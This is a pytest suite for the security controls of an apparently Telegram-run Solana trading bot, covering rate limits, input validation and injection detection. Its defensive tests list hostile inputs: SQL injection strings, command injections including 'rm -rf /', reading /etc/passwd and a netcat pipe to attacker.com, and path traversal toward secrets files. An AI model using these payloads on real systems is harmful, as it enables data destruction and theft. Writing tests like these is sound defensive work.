"""
Test suite for security controls.

This module tests security features:
- Rate limiting (commands, withdrawals, AI chat)
- Input validation and sanitization
- Security controls (confirmations, access, injection prevention)

Tests validate:
- Rate limiting enforcement
- Input validation for all types
- SQL/XSS injection prevention
- Proper error messages
- Security logging
"""

# Import mocking setup FIRST
from tests.conftest_commands import mock_external_modules
mock_external_modules()

import pytest
import time
from unittest.mock import AsyncMock, MagicMock, patch
from hypothesis import given, strategies as st, settings, Phase

# Import security classes
from agent.security.security import SecurityValidator, RateLimiter


@pytest.mark.asyncio
class TestRateLimiting:
    """
    Tests for rate limiting functionality.
    
    **Validates: Property 28**
    
    For any user sending more than 10 commands in a 60-second window,
    the system should reject subsequent commands with cooldown message
    until the window resets.
    """
    
    async def test_rate_limiter_allows_requests_within_limit(self, test_harness):
        """
        Test rate limiter allows requests within the limit.
        
        **Validates: Requirements 5.1**
        """
        # Setup
        rate_limiter = RateLimiter()
        user_id = "user_12345"
        
        # Execute - send 10 requests (within limit)
        for i in range(10):
            result = rate_limiter.check_rate_limit(user_id, max_requests=10, window_seconds=60)
            assert result is True, f"Request {i+1} should be allowed"
    
    async def test_rate_limiter_blocks_requests_exceeding_limit(self, test_harness):
        """
        Test rate limiter blocks requests exceeding the limit.
        
        **Validates: Requirements 5.1, 5.2**
        
        WHEN a user sends more than 10 commands in a 60-second window,
        THE Rate_Limiter SHALL reject subsequent commands with cooldown message.
        """
        # Setup
        rate_limiter = RateLimiter()
        user_id = "user_12345"
        
        # Execute - send 10 requests (at limit)
        for i in range(10):
            result = rate_limiter.check_rate_limit(user_id, max_requests=10, window_seconds=60)
            assert result is True, f"Request {i+1} should be allowed"
        
        # Execute - send 11th request (exceeds limit)
        result = rate_limiter.check_rate_limit(user_id, max_requests=10, window_seconds=60)
        
        # Assert - 11th request should be blocked
        assert result is False, "Request 11 should be blocked"
    
    async def test_rate_limiter_resets_after_window(self, test_harness):
        """
        Test rate limiter resets after time window expires.
        
        **Validates: Requirements 5.2**
        """
        # Setup
        rate_limiter = RateLimiter()
        user_id = "user_12345"
        
        # Execute - send 10 requests (at limit)
        for i in range(10):
            result = rate_limiter.check_rate_limit(user_id, max_requests=10, window_seconds=1)
            assert result is True
        
        # Verify limit is reached
        result = rate_limiter.check_rate_limit(user_id, max_requests=10, window_seconds=1)
        assert result is False, "Should be rate limited"
        
        # Wait for window to expire
        time.sleep(1.1)
        
        # Execute - send request after window expires
        result = rate_limiter.check_rate_limit(user_id, max_requests=10, window_seconds=1)
        
        # Assert - request should be allowed after window reset
        assert result is True, "Request should be allowed after window reset"
    
    async def test_rate_limiter_isolates_users(self, test_harness):
        """
        Test rate limiter isolates different users.
        
        **Validates: Requirements 5.1, 10.2**
        """
        # Setup
        rate_limiter = RateLimiter()
        user1 = "user_12345"
        user2 = "user_67890"
        
        # Execute - user1 hits rate limit
        for i in range(10):
            rate_limiter.check_rate_limit(user1, max_requests=10, window_seconds=60)
        
        # Verify user1 is rate limited
        result1 = rate_limiter.check_rate_limit(user1, max_requests=10, window_seconds=60)
        assert result1 is False, "User1 should be rate limited"
        
        # Execute - user2 should not be affected
        result2 = rate_limiter.check_rate_limit(user2, max_requests=10, window_seconds=60)
        
        # Assert - user2 is not rate limited
        assert result2 is True, "User2 should not be rate limited"
    
    async def test_command_rate_limiting_enforcement(self, test_harness):
        """
        Test command rate limiting is enforced in command handlers.
        
        **Validates: Requirements 5.1**
        """
        # Setup
        from agent.ui.commands.financial_commands import FinancialCommands
        
        mock_bot = MagicMock()
        mock_bot.wallet = test_harness.create_mock_wallet(balance=10.0)
        mock_bot.performance = test_harness.create_mock_performance_tracker()
        
        financial_commands = FinancialCommands(mock_bot)
        
        # Execute - send multiple withdraw commands rapidly
        user_id = 12345
        allowed_count = 0
        blocked_count = 0
        
        for i in range(15):
            update = test_harness.create_mock_telegram_update("withdraw", user_id=user_id)
            update.message.text = "/withdraw 0.1 TestAddress123456789012345678901234"
            context = test_harness.create_mock_telegram_context(
                args=["0.1", "TestAddress123456789012345678901234"]
            )
            
            await financial_commands.cmd_withdraw(update, context)
            
            # Check if rate limited
            call_args = update.message.reply_text.call_args
            message_text = call_args[0][0] if call_args[0] else call_args[1].get('text', '')
            
            if "Too many requests" in message_text or "wait" in message_text.lower():
                blocked_count += 1
            else:
                allowed_count += 1
        
        # Assert - some requests should be blocked
        assert blocked_count > 0, "Some requests should be blocked by rate limiting"
        assert allowed_count <= 5, "No more than 5 withdraw requests should be allowed"
    
    async def test_ai_chat_rate_limiting(self, test_harness):
        """
        Test AI chat rate limiting enforcement.
        
        **Validates: Requirements 5.1**
        """
        # Setup - this test verifies rate limiting is applied to AI chat
        # The actual implementation would be in the AI chat handler
        rate_limiter = RateLimiter()
        user_id = "user_12345"
        
        # AI chat typically has higher limits (e.g., 20 requests per minute)
        max_ai_requests = 20
        
        # Execute - send requests up to limit
        for i in range(max_ai_requests):
            result = rate_limiter.check_rate_limit(
                f"ai_chat_{user_id}",
                max_requests=max_ai_requests,
                window_seconds=60
            )
            assert result is True, f"AI chat request {i+1} should be allowed"
        
        # Execute - exceed limit
        result = rate_limiter.check_rate_limit(
            f"ai_chat_{user_id}",
            max_requests=max_ai_requests,
            window_seconds=60
        )
        
        # Assert - should be rate limited
        assert result is False, "AI chat should be rate limited after exceeding limit"


@pytest.mark.asyncio
class TestInputValidation:
    """
    Tests for input validation and sanitization.
    
    **Validates: Property 29**
    
    For any user input (wallet address, amount, token symbol),
    the system should validate format and reject invalid inputs
    with specific error messages.
    """
    
    async def test_validate_wallet_address_accepts_valid_address(self, test_harness):
        """
        Test wallet address validation accepts valid Solana addresses.
        
        **Validates: Requirements 5.3**
        """
        # Setup
        valid_addresses = [
            "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
            "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
            "So11111111111111111111111111111111111111112"
        ]
        
        # Execute & Assert
        for address in valid_addresses:
            result = SecurityValidator.validate_wallet_address(address)
            assert result == address, f"Valid address {address} should be accepted"
    
    async def test_validate_wallet_address_rejects_invalid_address(self, test_harness):
        """
        Test wallet address validation rejects invalid addresses.
        
        **Validates: Requirements 5.3**
        """
        # Setup
        invalid_addresses = [
            "",  # Empty
            "invalid",  # Too short
            "0x1234567890abcdef",  # Ethereum address
            "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263!",  # Invalid character
            "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263" + "x" * 50,  # Too long
        ]
        
        # Execute & Assert
        for address in invalid_addresses:
            with pytest.raises(ValueError) as exc_info:
                SecurityValidator.validate_wallet_address(address)
            
            assert "Invalid" in str(exc_info.value) or "cannot be empty" in str(exc_info.value), \
                f"Should reject invalid address: {address}"
    
    async def test_validate_amount_accepts_valid_amounts(self, test_harness):
        """
        Test amount validation accepts valid positive numbers.
        
        **Validates: Requirements 5.4**
        """
        # Setup
        valid_amounts = [0.1, 1.0, 10.5, 100.0, 1000.0]
        
        # Execute & Assert
        for amount in valid_amounts:
            result = SecurityValidator.validate_amount(amount, min_val=0.0, max_val=10000.0)
            assert result == float(amount), f"Valid amount {amount} should be accepted"
    
    async def test_validate_amount_rejects_invalid_amounts(self, test_harness):
        """
        Test amount validation rejects invalid amounts.
        
        **Validates: Requirements 5.4**
        """
        # Setup - test negative, zero, and excessive amounts
        test_cases = [
            (-1.0, "negative"),
            (-0.1, "negative"),
            (0.0, "zero"),  # Assuming min_val > 0
            (1000001.0, "excessive"),
        ]
        
        # Execute & Assert
        for amount, reason in test_cases:
            with pytest.raises(ValueError) as exc_info:
                SecurityValidator.validate_amount(amount, min_val=0.1, max_val=1000000.0)
            
            assert "must be at least" in str(exc_info.value) or "cannot exceed" in str(exc_info.value), \
                f"Should reject {reason} amount: {amount}"
    
    async def test_validate_amount_rejects_non_numeric(self, test_harness):
        """
        Test amount validation rejects non-numeric values.
        
        **Validates: Requirements 5.4**
        """
        # Setup
        invalid_amounts = ["abc", "1.0.0", None, [], {}]
        
        # Execute & Assert
        for amount in invalid_amounts:
            with pytest.raises(ValueError) as exc_info:
                SecurityValidator.validate_amount(amount)
            
            assert "must be a number" in str(exc_info.value), \
                f"Should reject non-numeric amount: {amount}"
    
    async def test_validate_strategy_name_accepts_valid_names(self, test_harness):
        """
        Test strategy name validation accepts valid names.
        
        **Validates: Requirements 5.5**
        """
        # Setup
        valid_names = [
            "airdrop_hunter",
            "jupiter_swap",
            "liquid_staking",
            "strategy_123"
        ]
        
        # Execute & Assert
        for name in valid_names:
            result = SecurityValidator.validate_strategy_name(name)
            assert result == name, f"Valid strategy name {name} should be accepted"
    
    async def test_validate_strategy_name_rejects_invalid_names(self, test_harness):
        """
        Test strategy name validation rejects invalid names.
        
        **Validates: Requirements 5.5**
        """
        # Setup
        invalid_names = [
            "",  # Empty
            "ab",  # Too short
            "Strategy-Name",  # Invalid character (uppercase, hyphen)
            "strategy name",  # Space
            "strategy;drop",  # Semicolon
            "a" * 100,  # Too long
        ]
        
        # Execute & Assert
        for name in invalid_names:
            with pytest.raises(ValueError) as exc_info:
                SecurityValidator.validate_strategy_name(name)
            
            assert "Invalid" in str(exc_info.value) or "cannot be empty" in str(exc_info.value), \
                f"Should reject invalid strategy name: {name}"
    
    async def test_sanitize_string_removes_null_bytes(self, test_harness):
        """
        Test string sanitization removes null bytes.
        
        **Validates: Requirements 5.5**
        """
        # Setup
        input_str = "test\x00string"
        
        # Execute
        result = SecurityValidator.sanitize_string(input_str, check_injections=False)
        
        # Assert
        assert "\x00" not in result, "Null bytes should be removed"
        assert result == "teststring", "String should be sanitized"
    
    async def test_sanitize_string_enforces_max_length(self, test_harness):
        """
        Test string sanitization enforces maximum length.
        
        **Validates: Requirements 5.5**
        """
        # Setup
        long_string = "a" * 2000
        
        # Execute & Assert
        with pytest.raises(ValueError) as exc_info:
            SecurityValidator.sanitize_string(long_string, max_length=1000)
        
        assert "too long" in str(exc_info.value).lower(), \
            "Should reject strings exceeding max length"


@pytest.mark.asyncio
class TestInjectionPrevention:
    """
    Tests for SQL injection and XSS prevention.
    
    **Validates: Property 32**
    
    For any input containing SQL injection or XSS patterns,
    the system should sanitize or reject the input and log the attempt.
    """
    
    async def test_detect_sql_injection_patterns(self, test_harness):
        """
        Test SQL injection detection blocks malicious patterns.
        
        **Validates: Requirements 5.9**
        
        WHEN SQL injection patterns are detected in input,
        THE Input_Validator SHALL reject and log the attempt.
        """
        # Setup - common SQL injection patterns
        sql_injection_attempts = [
            "'; DROP TABLE users;--",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "'; DELETE FROM trades;--",
            "1; UPDATE users SET balance=999999;--",
        ]
        
        # Execute & Assert
        for injection in sql_injection_attempts:
            with pytest.raises(ValueError) as exc_info:
                SecurityValidator.check_sql_injection(injection)
            
            assert "Invalid input" in str(exc_info.value), \
                f"Should detect SQL injection: {injection}"
    
    async def test_detect_command_injection_patterns(self, test_harness):
        """
        Test command injection detection blocks malicious patterns.
        
        **Validates: Requirements 5.10**
        
        WHEN XSS patterns are detected in input,
        THE Input_Validator SHALL sanitize before processing.
        """
        # Setup - common command injection patterns
        command_injection_attempts = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test`whoami`",
            "test$(whoami)",
            "../../../etc/passwd",
            "~/secret_file",
        ]
        
        # Execute & Assert
        for injection in command_injection_attempts:
            with pytest.raises(ValueError) as exc_info:
                SecurityValidator.check_command_injection(injection)
            
            assert "Invalid input" in str(exc_info.value), \
                f"Should detect command injection: {injection}"
    
    async def test_sanitize_string_detects_sql_injection(self, test_harness):
        """
        Test string sanitization detects SQL injection in combined check.
        
        **Validates: Requirements 5.9**
        """
        # Setup
        malicious_input = "user'; DROP TABLE users;--"
        
        # Execute & Assert
        with pytest.raises(ValueError) as exc_info:
            SecurityValidator.sanitize_string(malicious_input, check_injections=True)
        
        assert "Invalid input" in str(exc_info.value), \
            "Should detect SQL injection during sanitization"
    
    async def test_sanitize_string_detects_command_injection(self, test_harness):
        """
        Test string sanitization detects command injection in combined check.
        
        **Validates: Requirements 5.10**
        """
        # Setup
        malicious_input = "test; rm -rf /"
        
        # Execute & Assert
        with pytest.raises(ValueError) as exc_info:
            SecurityValidator.sanitize_string(malicious_input, check_injections=True)
        
        assert "Invalid input" in str(exc_info.value), \
            "Should detect command injection during sanitization"
    
    async def test_sanitize_string_allows_safe_conversation_text(self, test_harness):
        """
        Test string sanitization allows safe conversation text when injection checks disabled.
        
        **Validates: Requirements 6.1**
        
        Conversation text should not be checked for injections as it may
        contain legitimate SQL/command keywords in natural language.
        """
        # Setup - legitimate conversation that might contain SQL keywords
        conversation_texts = [
            "How do I SELECT the best strategy?",
            "Can you DELETE my old trades?",
            "What's the OR condition for this?",
        ]
        
        # Execute & Assert
        for text in conversation_texts:
            # Should not raise exception when check_injections=False
            result = SecurityValidator.sanitize_string(text, check_injections=False)
            assert result == text, f"Should allow conversation text: {text}"


@pytest.mark.asyncio
class TestSecurityControls:
    """
    Tests for security controls (confirmations, access control).
    
    **Validates: Properties 30, 31**
    """
    
    async def test_sensitive_operation_requires_confirmation(self, test_harness):
        """
        Test sensitive operations require confirmation.
        
        **Validates: Property 30, Requirements 5.7**
        
        WHEN sensitive operations are requested (withdrawal, fee payment, wallet export),
        THE Telegram_Interface SHALL require confirmation before execution.
        """
        # Setup
        from agent.ui.commands.financial_commands import FinancialCommands
        
        mock_bot = MagicMock()
        mock_bot.wallet = test_harness.create_mock_wallet(balance=10.0)
        mock_bot.performance = test_harness.create_mock_performance_tracker()
        
        financial_commands = FinancialCommands(mock_bot)
        
        # Execute - attempt withdrawal
        update = test_harness.create_mock_telegram_update("withdraw", user_id=12345)
        context = test_harness.create_mock_telegram_context(
            args=["1.0", "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263"]
        )
        
        await financial_commands.cmd_withdraw(update, context)
        
        # Assert - should send confirmation message or require confirmation
        assert update.message.reply_text.called, "Should send response message"
        call_args = update.message.reply_text.call_args
        message_text = call_args[0][0] if call_args[0] else call_args[1].get('text', '')
        
        # Check if confirmation is requested or withdrawal is processed
        # (Implementation may vary - either inline confirmation or callback)
        assert len(message_text) > 0, "Should send some response"
    
    async def test_path_traversal_prevention(self, test_harness):
        """
        Test path traversal attempts are blocked.
        
        **Validates: Requirements 5.9**
        """
        # Setup - path traversal attempts
        malicious_paths = [
            "../../../etc/passwd",
            "../../config/secrets.json",
            "~/private_keys",
            "config/../../../etc/passwd",
        ]
        
        # Execute & Assert
        for path in malicious_paths:
            with pytest.raises(ValueError) as exc_info:
                SecurityValidator.validate_file_path(path, base_dir="config")
            
            assert "not allowed" in str(exc_info.value).lower() or "outside" in str(exc_info.value).lower(), \
                f"Should block path traversal: {path}"
    
    async def test_validate_json_data_checks_size(self, test_harness):
        """
        Test JSON data validation enforces size limits.
        
        **Validates: Requirements 5.4**
        """
        # Setup - large JSON data
        large_data = {"key": "x" * 20000}
        
        # Execute & Assert
        with pytest.raises(ValueError) as exc_info:
            SecurityValidator.validate_json_data(large_data, max_size=10000)
        
        assert "too large" in str(exc_info.value).lower(), \
            "Should reject oversized JSON data"
    
    async def test_validate_json_data_sanitizes_values(self, test_harness):
        """
        Test JSON data validation sanitizes string values.
        
        **Validates: Requirements 5.9**
        """
        # Setup - JSON with SQL injection in value
        malicious_data = {
            "username": "admin'; DROP TABLE users;--"
        }
        
        # Execute & Assert
        with pytest.raises(ValueError) as exc_info:
            SecurityValidator.validate_json_data(malicious_data)
        
        assert "Invalid input" in str(exc_info.value), \
            "Should detect injection in JSON values"


@pytest.mark.asyncio
class TestRateLimitingPropertyTests:
    """
    Property-based tests for rate limiting.
    
    **Validates: Property 28**
    """
    
    @given(
        num_requests=st.integers(min_value=1, max_value=50),
        max_allowed=st.integers(min_value=5, max_value=20)
    )
    @settings(
        max_examples=20,
        phases=[Phase.generate, Phase.target],
        deadline=None
    )
    async def test_rate_limiter_enforces_limit_property(
        self,
        num_requests,
        max_allowed
    ):
        """
        Property: Rate limiter enforces configured limits.
        
        **Validates: Requirements 5.1**
        
        For any number of requests and any configured limit,
        the rate limiter should allow exactly max_allowed requests
        and block all subsequent requests within the window.
        """
        # Setup
        rate_limiter = RateLimiter()
        user_id = f"user_property_test_{num_requests}_{max_allowed}"
        
        allowed_count = 0
        blocked_count = 0
        
        # Execute - send num_requests
        for i in range(num_requests):
            result = rate_limiter.check_rate_limit(
                user_id,
                max_requests=max_allowed,
                window_seconds=60
            )
            
            if result:
                allowed_count += 1
            else:
                blocked_count += 1
        
        # Assert - exactly max_allowed should be allowed
        if num_requests <= max_allowed:
            assert allowed_count == num_requests, \
                f"Should allow all {num_requests} requests when under limit {max_allowed}"
            assert blocked_count == 0, \
                f"Should not block any requests when under limit"
        else:
            assert allowed_count == max_allowed, \
                f"Should allow exactly {max_allowed} requests"
            assert blocked_count == num_requests - max_allowed, \
                f"Should block {num_requests - max_allowed} requests"
    
    @given(
        num_users=st.integers(min_value=2, max_value=10),
        requests_per_user=st.integers(min_value=5, max_value=15)
    )
    @settings(
        max_examples=15,
        phases=[Phase.generate, Phase.target],
        deadline=None
    )
    async def test_rate_limiter_isolates_users_property(
        self,
        num_users,
        requests_per_user
    ):
        """
        Property: Rate limiter isolates users.
        
        **Validates: Requirements 10.2**
        
        For any number of users, each user's rate limit should be
        independent and not affected by other users' requests.
        """
        # Setup
        rate_limiter = RateLimiter()
        max_allowed = 10
        
        # Execute - each user sends requests
        results_by_user = {}
        
        for user_idx in range(num_users):
            user_id = f"user_{user_idx}"
            allowed = 0
            blocked = 0
            
            for req_idx in range(requests_per_user):
                result = rate_limiter.check_rate_limit(
                    user_id,
                    max_requests=max_allowed,
                    window_seconds=60
                )
                
                if result:
                    allowed += 1
                else:
                    blocked += 1
            
            results_by_user[user_id] = {"allowed": allowed, "blocked": blocked}
        
        # Assert - each user should have same pattern
        for user_id, results in results_by_user.items():
            if requests_per_user <= max_allowed:
                assert results["allowed"] == requests_per_user, \
                    f"{user_id}: Should allow all requests when under limit"
                assert results["blocked"] == 0, \
                    f"{user_id}: Should not block any requests when under limit"
            else:
                assert results["allowed"] == max_allowed, \
                    f"{user_id}: Should allow exactly {max_allowed} requests"
                assert results["blocked"] == requests_per_user - max_allowed, \
                    f"{user_id}: Should block excess requests"


@pytest.mark.asyncio
class TestInputValidationPropertyTests:
    """
    Property-based tests for input validation.
    
    **Validates: Property 29**
    """
    
    @given(
        amount=st.floats(min_value=0.001, max_value=1000000.0, allow_nan=False, allow_infinity=False)
    )
    @settings(
        max_examples=30,
        phases=[Phase.generate, Phase.target],
        deadline=None
    )
    async def test_validate_amount_accepts_valid_range_property(
        self,
        amount
    ):
        """
        Property: Amount validation accepts all values in valid range.
        
        **Validates: Requirements 5.4**
        
        For any amount within the configured min/max range,
        validation should succeed and return the amount as float.
        """
        # Execute
        result = SecurityValidator.validate_amount(
            amount,
            min_val=0.001,
            max_val=1000000.0
        )
        
        # Assert
        assert result == float(amount), \
            f"Should accept valid amount {amount}"
        assert isinstance(result, float), \
            "Should return float type"
    
    @given(
        text=st.text(
            alphabet=st.characters(blacklist_categories=('Cs',)),
            min_size=1,
            max_size=100
        ).filter(lambda s: not any(pattern in s.upper() for pattern in ['DROP', 'DELETE', 'INSERT', 'UPDATE', ';', '--']))
    )
    @settings(
        max_examples=30,
        phases=[Phase.generate, Phase.target],
        deadline=None
    )
    async def test_sanitize_safe_strings_property(
        self,
        text
    ):
        """
        Property: String sanitization accepts safe strings.
        
        **Validates: Requirements 5.5**
        
        For any string without injection patterns and within length limits,
        sanitization should succeed and return cleaned string.
        """
        # Execute
        try:
            result = SecurityValidator.sanitize_string(
                text,
                max_length=1000,
                check_injections=True
            )
            
            # Assert
            assert isinstance(result, str), "Should return string"
            assert '\x00' not in result, "Should remove null bytes"
            assert len(result) <= 1000, "Should respect max length"
        except ValueError as e:
            # If validation fails, it should be for a legitimate reason
            error_msg = str(e).lower()
            assert any(keyword in error_msg for keyword in ['invalid', 'too long', 'empty']), \
                f"Unexpected validation error: {e}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
